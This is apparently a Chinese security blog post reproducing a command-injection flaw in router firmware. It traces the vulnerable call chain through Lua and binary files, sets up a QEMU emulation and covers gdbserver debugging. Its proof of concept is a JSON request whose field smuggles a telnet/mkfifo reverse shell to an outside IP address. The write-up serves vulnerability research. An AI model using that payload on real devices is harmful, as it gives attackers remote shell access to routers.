<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 网络合并</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span><span class="params">(params)</span></span><span class="comment">-- params就是传入的json.params</span></span><br><span class="line">    <span class="keyword">local</span> cmd = <span class="built_in">require</span> <span class="string">&quot;luci.modules.cmd&quot;</span></span><br><span class="line">    <span class="keyword">return</span> cmd.devSta.set(&#123;device = <span class="string">&quot;pc&quot;</span>, <span class="built_in">module</span> = <span class="string">&quot;networkId_merge&quot;</span>, data = params, async = <span class="literal">true</span>&#125;) <span class="comment">-- data是json.params</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<p><code>cmd.devSta.set()</code>中，<code>doParams()</code>执行完得到的data是<code>json.params.data</code>，接着会执行<code>fetch()</code>。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line">devSta[opt[i]] = <span class="function"><span class="keyword">function</span><span class="params">(params)</span></span></span><br><span class="line">        <span class="keyword">local</span> model = <span class="built_in">require</span> <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">        params.method = opt[i]</span><br><span class="line">        params.cfg_cmd = <span class="string">&quot;dev_sta&quot;</span></span><br><span class="line">        <span class="keyword">local</span> data, back, ip, password, shell = doParams(params)</span><br><span class="line">        <span class="keyword">return</span> fetch(model.fetch, shell, params, opt[i], params.<span class="built_in">module</span>, data, back, ip, password)</span><br><span class="line">    <span class="keyword">end</span> <span class="comment">-- deSta.data =&gt; json.params.data</span></span><br></pre></td></tr></table></figure>

<p>接着看cmd.fetch()，这个函数会调用<code>model.fetch</code>(<code>dev_sta.fetch()</code>)函数也就是传入其自身的第一个参数，而参数就是自身参数中的除前三个以外的参数，其中有可控data字段。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- return fetch(model.fetch, shell, params, opt[i], params.module, data, back, ip, password)</span></span><br><span class="line"><span class="keyword">local</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">(fn, shell, params, ...)</span></span></span><br><span class="line">    <span class="built_in">require</span> <span class="string">&quot;luci.json&quot;</span></span><br><span class="line">    <span class="keyword">local</span> tool = <span class="built_in">require</span> <span class="string">&quot;luci.utils.tool&quot;</span></span><br><span class="line">    <span class="keyword">local</span> _start = <span class="built_in">os</span>.<span class="built_in">time</span>()</span><br><span class="line">    <span class="keyword">local</span> _res = fn(...)</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<p><code>dev_sta.fetch()</code>（位于<code>/usr/lib/lua/dev_sta.lua</code>）中对一些字段进行了重新赋值，最后调用了<code>client_call</code>函数，位于<code>/usr/lib/lua/libuflua.so</code>文件。</p>
<figure class="highlight lua"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fetch</span><span class="params">(cmd, module, param, back, ip, password, force, not_change_configId, multi)</span></span></span><br><span class="line"><span class="keyword">local</span> uf_call = <span class="built_in">require</span> <span class="string">&quot;libuflua&quot;</span></span><br><span class="line">...</span><br><span class="line"><span class="keyword">local</span> stat = uf_call.client_call(ctype, cmd, <span class="built_in">module</span>, param, back, ip, password, force, not_change_configId, multi)</span><br></pre></td></tr></table></figure>

<h3 id="libuflua-so文件"><a href="#libuflua-so文件" class="headerlink" title="libuflua.so文件"></a>libuflua.so文件</h3><p>libuflua.so是一个二进制文件，用IDA打开直接查找client_call函数，没有找到，有<code>uf_client_call</code>函数，</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272146446.png" alt="202504081952215"></p>
<p><code>shift+f12</code>搜索字符串，也只有<code>uf_client_call</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272145928.png" alt="image-20250408195528076" style="zoom:50%;" />

<p>这里有一个解释就是IDA没有把<code>client_call</code>解析成字符串，而是解析成了代码。那我们可以用<code>010Editor</code>打开该文件，搜索字符串<code>client_call</code>，发现其地址为<code>0xff0</code></p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272145915.png" alt="image-20250408200411164" style="zoom:67%;" />

<p>然后在IDA中定位到<code>0xff0</code>地址，选中左边的地址，然后按A，就能以字符串的形式呈现了，如下</p>
<p>、<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272144513.png" alt="image-20250408201016082"></p>
<p>选中<code>client_call</code>进行交叉引用跳到如下之处</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272144662.png" alt="image-20250408202529406"></p>
<p>通过<code>DATA XREF</code>数据交叉引用提示可以知道，该数据从<code>luaopen_libuflua</code>函数的起始地址偏移<code>2C</code>字节处被引用，定位到该函数如下</p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272143942.png" alt="image-20250408203414524"></p>
<p>这段代码的作用是将扩展库<code>libuflua</code>注册到Lua环境中</p>
<p>在文件系统中搜索<code>uf_client_call</code>字符串，结合出现过其的二进制文件和<code>libuflua.so</code>文件所依赖的共享库，可以发现<code>uf_client_call</code>函数定义在<code>/usr/lib/libunifyframe.so</code>中</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272144234.png" alt="image-20250408205758936" style="zoom: 67%;" />

<h3 id="libunifyframe-so文件"><a href="#libunifyframe-so文件" class="headerlink" title="libunifyframe.so文件"></a>libunifyframe.so文件</h3><p>用IDA打开<code>libunifyframe.so</code>文件，对<code>uf_client_call</code>函数进行分析，可知传进来的各个字段会被解析成JSON字符串，作为键值与自定义的键以键值对的形式添加到JSON对象中，然后JSON对象会被转换成JSON格式的字符串，通过<code>uf_socket_msg_write</code>用<code>socket</code>套接字进行数据传输。</p>
<blockquote>
<p>既然这里采用<code>uf_socket_msg_write</code>进行数据发送，那么肯定有某个地方<strong>会使用<code>uf_socket_msg_read</code>进行数据接收</strong>，再进一步处理。匹配一下，一共三个文件，很容易锁定<code>/usr/sbin/unifyframe-sgi.elf</code>文件。又发现在初始化脚本<code>/etc/init.d/unifyframe-sgi</code>中，启动了<code>unifyframe-sgi.elf</code>，即<strong>说明<code>unifyframe-sgi.elf</code>一直挂在进程中</strong>。因此，我们可以确定<code>unifyframe-sgi.elf</code>就是接收<code>libunifyframe.so</code>所发数据的文件（这里采用了<code>Ubus</code>总线进行进程间通信）。</p>
</blockquote>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272143370.png" alt="image-20250409142447149" style="zoom: 67%;" />

<h2 id="分析二进制文件"><a href="#分析二进制文件" class="headerlink" title="分析二进制文件"></a>分析二进制文件</h2><p>在unifyframe-sgi.elf文件中定位到<code>uf_socket_msg_read</code>函数开始分析。<code>uf_socket_msg_read(*v29, v31 + 1);</code>中的两个参数第一个是文件描述符（ida分析libunifyframe.so文件），第二个是接收数据存储的位置（这个要动态调试对比uf_socket_msg_read函数执行前后a2寄存器存储的地址里的内容）</p>
<p>之后解析字段<strong>、</strong>执行具体操作的两个函数分别为 <code>parse_content</code>和<code>add_pkg_cmd2_task</code>，如下：</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272144357.png" alt="QQ_1745750405617" style="zoom:50%;" />

<p>根据对<code>parse_content</code>的分析可知，具体进行数据解析的位置应该是<code>parse_obj2_cmd</code>函数</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272144239.png" alt="image-20250427184613995" style="zoom:50%;" />

<p><code>parse_obj2_cmd</code> 函数结束后，会执行 <code>pkg_add_cmd(a1, v16)</code> ，它的核心作用就是在 <code>a1</code> 这个数据结构中记录了 <code>v16</code> 的指针，使得后续操作通过 <code>a1</code> 访问到刚刚解析出来的各个字段。</p>
<p>在<code>ufm_handle</code>函数中，由于我们是<code>set</code>方式，因此会调用到<code>sub_410140</code>函数。进入<code>sub_410140</code>函数，首先<code>sn</code>字段为空的条件满足，跳转到<code>LABEL_36</code>，<code>LABEL_36</code>处会调用到<code>sub_40DA38</code>函数。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">v6 = json_object_object_get(a1[<span class="number">22</span>], <span class="string">&quot;sn&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> ( !v6 )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_36;</span><br><span class="line">...</span><br><span class="line">LABEL_36:</span><br><span class="line">  ...</span><br><span class="line">  v5 = sub_40DA38(a1, a1 + <span class="number">21</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure>

<p>在<code>sub_40DA38</code>函数中，定位到下面这一处，<code>v5</code>和<code>v6</code>分别是<code>a3</code>和<code>a4</code>，因为传入的值均为零，所以会进入<code>else</code>分支，这里会将<code>data</code>字段的内容拼接到两个单引号内。此处<code>v4</code>字符串形如<code>/usr/sbin/module_call set networkId_merge &#39;xxx&#39;</code>，很显然是一个命令，并且单引号内的内容我们可控，所以我们只需要左右分别闭合单引号，中间注入恶意命令，并用分隔符隔开即可完成命令注入。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">LODWORD(v5) = a3;</span><br><span class="line">v6 = a4;</span><br><span class="line">...</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    v84 = <span class="built_in">snprintf</span>(</span><br><span class="line">        v4,</span><br><span class="line">        v75,</span><br><span class="line">        <span class="string">&quot;/usr/sbin/module_call %s %s&quot;</span>,</span><br><span class="line">        *((<span class="type">const</span> <span class="type">char</span> **)v7 + <span class="number">5</span>),</span><br><span class="line">        (<span class="type">const</span> <span class="type">char</span> *)(*((_QWORD *)v7 + <span class="number">23</span>) + <span class="number">16LL</span>));</span><br><span class="line">    v85 = &amp;v4[v84];</span><br><span class="line">    v86 = (<span class="type">const</span> <span class="type">char</span> *)*((_QWORD *)v7 + <span class="number">19</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v86 )</span><br><span class="line">        v85 += <span class="built_in">snprintf</span>(&amp;v4[v84], v75, <span class="string">&quot; &#x27;%s&#x27;&quot;</span>, v86);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接着，由之前的分析，此处<code>v7</code>偏移<code>8</code>的位置为<code>0</code>（<code>async</code>不是<code>false</code>），故进入<code>else</code>分支，其中会将<code>v4</code>传入<code>ufm_commit_add</code>函数，作为第二个参数，然后继续进入<code>async_cmd_push_queue</code>函数。此处，<code>a1</code>为<code>0</code>，将<code>a2</code>存入<code>v4</code>偏移<code>6\*8</code>字节处，然后跳转到<code>LABEL_34</code>的位置。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !a1 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( a2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v19 = strdup(a2);</span><br><span class="line">      *(v7 + <span class="number">28</span>) = v19;</span><br><span class="line">      <span class="keyword">if</span> ( v19 )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br></pre></td></tr></table></figure>

<p>在<code>LABEL_34</code>处，会释放一个信号量，信号量的地址是<code>&amp;unk_4360A8</code>，对该地址进行交叉引用可以定位到<code>sub_41AFC8</code>函数，在该函数中会调用一个<code>sub_41ADF0</code>函数。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272144487.png" alt="image-20250427191456589" style="zoom:50%;" />

<p>在<code>sub_41ADF0</code>函数中，<code>a1</code>偏移<code>32</code>的位置存储的值为<code>0</code>。因此，会将<code>a1+13</code>处的数据也就是命令执行字符串作为<code>popen</code>的参数执行，且没有任何过滤。</p>
<img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272144001.png" alt="image-20250427192057384" style="zoom: 33%;" />

<p>poc：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span><span class="string">&quot;merge&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;params&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;sorry&quot;</span><span class="punctuation">:</span><span class="string">&quot;&#x27;$(mkfifo /tmp/test;telnet 192.168.107.136 6666 0&lt;/tmp/test|/bin/sh &gt; /tmp/test)&#x27;&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="仿真模拟"><a href="#仿真模拟" class="headerlink" title="仿真模拟"></a>仿真模拟</h2><p>net.sh</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">sudo</span> ifconfig eth0 down   <span class="comment">#关闭宿主机网卡接口</span></span></span><br><span class="line">sudo brctl addbr br0   #添加一座名为br0的网桥</span><br><span class="line">sudo brctl addif br0 ens33   #在br0中添加一个接口</span><br><span class="line">sudo brctl stp br0 off   #如果只有一个网桥，则关闭生成树协议</span><br><span class="line">sudo brctl setfd br0 1   #设置br0的转发延迟</span><br><span class="line">sudo brctl sethello br0 1   #设置br0的hello时间</span><br><span class="line">sudo ifconfig br0 0.0.0.0 promisc up   #启用br0接口</span><br><span class="line">sudo ifconfig ens33 0.0.0.0 promisc up   #启用网卡接口</span><br><span class="line">sudo dhclient br0   #从dhcp服务器获得br0的IP地址</span><br><span class="line">sudo brctl show br0   #查看虚拟网桥列表</span><br><span class="line">sudo brctl showstp br0   #查看br0的各接口信息</span><br><span class="line">sudo tunctl -t tap0 -u root   #创建一个tap0接口，只允许root用户访问</span><br><span class="line">sudo brctl addif br0 tap0   #在虚拟网桥中增加一个tap0接口</span><br><span class="line">sudo ifconfig tap0 0.0.0.0 promisc up   #启用tap0接口</span><br><span class="line">sudo brctl showstp br0</span><br></pre></td></tr></table></figure>

<p>start.sh（qemu启动脚本）</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">sudo qemu-system-mipsel \</span><br><span class="line">    -cpu 74Kf \</span><br><span class="line">    -M malta \</span><br><span class="line">    -kernel /home/wen/Desktop/mips_qemu_system/vmlinux-2.6.32-5-4kc-malta \</span><br><span class="line">    -hda /home/wen/Desktop/mips_qemu_system/debian_squeeze_mipsel_standard.qcow2 \</span><br><span class="line">    -append &quot;root=/dev/sda1 console=tty0&quot; \</span><br><span class="line">    -nographic -net nic \</span><br><span class="line">    -net tap,ifname=tap0,script=no,downscript=no</span><br></pre></td></tr></table></figure>

<p>首先将文件系统传到模拟器中</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">scp ./squashfs-root.tar.gz root@192.168.107.135:/root/</span><br></pre></td></tr></table></figure>

<p>设置squashfs-root作为qemu模拟器的根目录（<strong>exit 退出</strong>）</p>
<blockquote>
<p>仿真系统只是切换了根目录，本质还是<code>qemu</code>虚拟机的系统，故<code>proc</code>和<code>dev</code>这两个重要的系统目录仍应该是这个系统本身的目录，即<code>qemu</code>虚拟机的系统目录，而切换了根目录后，<code>proc</code>和<code>dev</code>也被切换，因此需要挂载为原先的目录</p>
</blockquote>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd squashfs-root</span><br><span class="line">chmod -R 777 ./   #赋予权限</span><br><span class="line">mount --bind /proc ./proc   #将原根目录下的proc和dev挂载到squashfs-root目录下</span><br><span class="line">mount --bind /dev ./dev</span><br><span class="line">chroot . /bin/sh   #将squashfs-root目录切换为根目录</span><br></pre></td></tr></table></figure>

<p>在进行下一步前，先了解一下<strong>路由器根文件系统下的一些重点目录</strong>：</p>
<table>
<thead>
<tr>
<th>目录</th>
<th>存储的文件</th>
</tr>
</thead>
<tbody><tr>
<td><code>bin</code>、<code>sbin</code>目录，<br /><code>/usr/bin</code>、<code>/usr/sbin</code>目录</td>
<td>路由器中的应用程序</td>
</tr>
<tr>
<td><code>lib</code>目录<br /><code>/usr/lib</code>目录</td>
<td>程序运行时需要的动态库文件</td>
</tr>
<tr>
<td><code>etc</code></td>
<td><strong>程序自启动</strong>配置文件，<br /><strong>初始化脚本文件</strong>，<br />各种<strong>服务器（Web服务器）</strong>的配置文件等路由器配置文件</td>
</tr>
</tbody></table>
<blockquote>
<p>首先，对于<code>OpenWRT</code>来说，内核加载完文件系统后，<strong>首先会启动<code>/sbin/init</code>进程</strong>，其中会进一步执行<code>/etc/preinit</code>和<code>/sbin/procd</code>，进行初步初始化。这当然也是仿真模拟的第一步，在启动<code>/sbin/init</code>后，会卡住挂在进程中，我们可以再<code>ssh</code>开一个新窗口进行后续操作，也可以<strong>用<code>/sbin/init &amp;</code>将其作为后台进程执行</strong>。</p>
</blockquote>
<p>执行**<code>/sbin/init</code>**命令，然后<code>ssh root@192.168.107.128</code>另开一个终端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> squashfs-root</span><br><span class="line"><span class="built_in">chroot</span> . sh</span><br></pre></td></tr></table></figure>

<blockquote>
<p>接着，真实系统会根据<code>/etc/inittab</code>中按编号次序执行<code>/etc/rc.d</code>中的初始化脚本，而<code>/etc/rc.d</code>中的文件都是<code>/etc/init.d</code>中对应文件的软链接。虽然说真实系统会依次执行所有的初始化脚本，但我们此处的仿真只是为了验证我们的漏洞，因此只需要部分仿真即可。</p>
</blockquote>
<p>启动<strong>http</strong>服务，对应<code>/etc/init.d/lighttpd</code>初始化脚本，用**<code>/etc/init.d/lighttpd start</code>**命令启动服务。这一步报错了，缺少<code>/var/run/lighttpd.pid</code>文件，一般这种缺什么补什么就好了，创建<code>/var/run/lighttpd.pid</code>文件即可。</p>
<p>接下来要启动<code>unifyframe-sgi</code>，但是要先执行**<code>/sbin/ubusd</code><strong>启动</strong>usbs<strong>服务，否则后面会报错，然后才能执行</strong><code>/etc/init.d/unifyframe-sgi start</code>**命令启动<code>unifyframe-sgi</code>。</p>
<p>执行**<code>/usr/sbin/unifyframe-sgi.elf</code>**运行程序，报错缺少<code>/tmp/rg_device/rg_device.json</code>文件，结合<code>unifyframe-sgi.elf</code>二进制文件分析，将<code>/sbin/hw/60010081/rg_device.json</code>复制到<code>/tmp/rg_device/</code>目录(该目录由自己创建)下即可。</p>
<h3 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h3><p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272143818.png" alt="image-20250427195149569"></p>
<p><img src="https://raw.githubusercontent.com/Qwen11/picture/main/202504272143832.png" alt="image-20250427195532949"></p>
<h2 id="gdbserver调试"><a href="#gdbserver调试" class="headerlink" title="gdbserver调试"></a>gdbserver调试</h2><p><a target="_blank" rel="noopener" href="https://github.com/stayliv3/gdb-static-cross/tree/master/prebuilt">gdbserver下载</a></p>
<p><a target="_blank" rel="noopener" href="https://people.debian.org/~aurel32/qemu/mipsel/">kernel下载</a></p>
<p>这里是借助gdbserver通过网络进行远程调试。把下载的对应版本的gdbserver传到qemu模拟器中，在qemu中启动程序并使用gdbserver监听一个端口，然后在宿主机上远程连接即可。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">直接启动程序调试</span></span><br><span class="line">./gdbserver-7.7.1-mipsel-mips32-v1 :1234 /usr/sbin/unifyframe-sgi.elf</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">劫持已运行的进程调试</span></span><br><span class="line">./gdbserver-7.7.1-mipsel-mips32-v1 :1234 --attach 11623 # 11623是要调试进程的pid</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">在宿主机运行下面内容</span></span><br><span class="line">gdb-multiarch</span><br><span class="line">target remote 192.168.107.135:1234</span><br></pre></td></tr></table></figure>

<p>报错：</p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; target remote <span class="number">192.168</span><span class="number">.207</span><span class="number">.135</span>:<span class="number">1234</span></span><br><span class="line"></span><br><span class="line">Remote debugging <span class="keyword">using</span> <span class="number">192.168</span><span class="number">.240</span><span class="number">.136</span>:<span class="number">1234</span></span><br><span class="line"><span class="function"><span class="title">Ignoring</span></span> packet error, continuing...</span><br><span class="line">warning: unrecognized item <span class="string">&quot;timeout&quot;</span> in <span class="string">&quot;qSupported&quot;</span> response</span><br><span class="line"><span class="function"><span class="title">Ignoring</span></span> packet error, continuing...</span><br><span class="line">Remote replied unexpectedly to <span class="string">&#x27;vMustReplyEmpty&#x27;</span>: timeout</span><br></pre></td></tr></table></figure>

<p>查了一下是因为仿真环境的内核版本与gdbserver版本不匹配的问题，在启动仿真环境的时候设置<code>-kernel</code>参数为<code>vmlinux-3.2.0-4-4kc-malta</code>版本即可。</p>
<p>这个问题困扰了我不少时间，想到一开始搭建仿真环境的时候，图省事就没有重新下载内核文件用的还是上一个复现DIR815时的内核，没想到啊却因此费了很多时间和精力😅</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/JiMoKuangXiangQu/articles/18812411#211-%E5%87%86%E5%A4%87-%E5%AE%A2%E6%88%B7%E7%AB%AF-gdb-%E7%A8%8B%E5%BA%8F">gdbserver 指南 - JiMoKuangXiangQu - 博客园</a></p>
<p><a target="_blank" rel="noopener" href="https://zikh26.github.io/posts/e5651b4f.html#lua%E6%96%87%E4%BB%B6%E7%9A%84%E8%B0%83%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90">站在巨人肩膀上复现CVE-2023-34644 | ZIKH26’s Blog</a></p>
<p>[<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-277386.htm#msg_header_h2_2">原创] 记一次全设备通杀未授权RCE的挖掘经历-智能设备-看雪-安全社区|安全招聘|kanxue.com</a></p>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/IOT%E5%AE%89%E5%85%A8/" rel="tag"># IOT安全</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/post/DIR-815%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="prev" title="DIR-815路由器溢出漏洞复现">
      <i class="fa fa-chevron-left"></i> DIR-815路由器溢出漏洞复现
    </a></div>
      <div class="post-nav-item">
    <a href="/post/CVE-2017-17215%E5%A4%8D%E7%8E%B0/" rel="next" title="CVE-2017-17215复现_华为HG532命令执行">
      CVE-2017-17215复现_华为HG532命令执行 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">
      <!-- require APlayer -->
      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
      <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
      <!-- require MetingJS-->
      <script src="https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js"></script>
      <meting-js
        auto="https://y.qq.com/n/yqq/playlist/9454682797.html#stat=y_new.playlist.pic_click">
      </meting-js>

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%BA%E4%BB%B6"><span class="nav-number">1.</span> <span class="nav-text">固件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AF%BB%E6%89%BE%E6%BC%8F%E6%B4%9E%E6%96%87%E4%BB%B6"><span class="nav-number">2.</span> <span class="nav-text">寻找漏洞文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#api-lua%E6%96%87%E4%BB%B6"><span class="nav-number">2.1.</span> <span class="nav-text">api.lua文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#jsonrpc-lua%E6%96%87%E4%BB%B6"><span class="nav-number">2.2.</span> <span class="nav-text">jsonrpc.lua文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#json-method"><span class="nav-number">2.3.</span> <span class="nav-text">json.method</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#login"><span class="nav-number">2.3.1.</span> <span class="nav-text">login()</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#merge"><span class="nav-number">2.3.2.</span> <span class="nav-text">merge()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#libuflua-so%E6%96%87%E4%BB%B6"><span class="nav-number">2.4.</span> <span class="nav-text">libuflua.so文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#libunifyframe-so%E6%96%87%E4%BB%B6"><span class="nav-number">2.5.</span> <span class="nav-text">libunifyframe.so文件</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%86%E6%9E%90%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%96%87%E4%BB%B6"><span class="nav-number">3.</span> <span class="nav-text">分析二进制文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%BF%E7%9C%9F%E6%A8%A1%E6%8B%9F"><span class="nav-number">4.</span> <span class="nav-text">仿真模拟</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%94%BB%E5%87%BB%E6%BC%94%E7%A4%BA"><span class="nav-number">4.1.</span> <span class="nav-text">攻击演示</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#gdbserver%E8%B0%83%E8%AF%95"><span class="nav-number">5.</span> <span class="nav-text">gdbserver调试</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="nav-number">6.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Qwen"
      src="/images/avatar_2.jpg">
  <p class="site-author-name" itemprop="name">Qwen</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">59</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">18</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2025</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Qwen</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">280k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">4:14</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
  </div>




    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>



        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="总访客量">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="总访问量">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  

